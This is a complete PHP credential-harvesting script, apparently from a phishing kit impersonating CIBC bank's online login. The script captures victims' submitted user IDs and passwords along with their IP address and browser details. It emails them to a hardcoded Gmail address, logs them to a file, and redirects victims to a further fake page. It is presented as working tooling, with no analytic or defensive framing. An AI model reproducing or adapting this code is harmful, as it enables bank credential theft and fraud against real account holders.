<?php
$ip = getenv("REMOTE_ADDR");
include 'blocker.php';
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");
$cc = $_POST['id'];
$pp = $_POST['pass'];
$data ="
=============## CIBC LOGIN ##==================
|USER : $cc
|PASS : $pp
============## Goodies ##=======================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##CIBC #$browserAgent";

$emailusr = 'sarkolouty@gmail.com';

mail($emailusr, $subj, $data);	

 $fp = fopen("../CIlogs.txt", "a");
 //write to the file
 fwrite($fp, $data);
 fclose($fp);

header("Location: ./online/index.html");

?>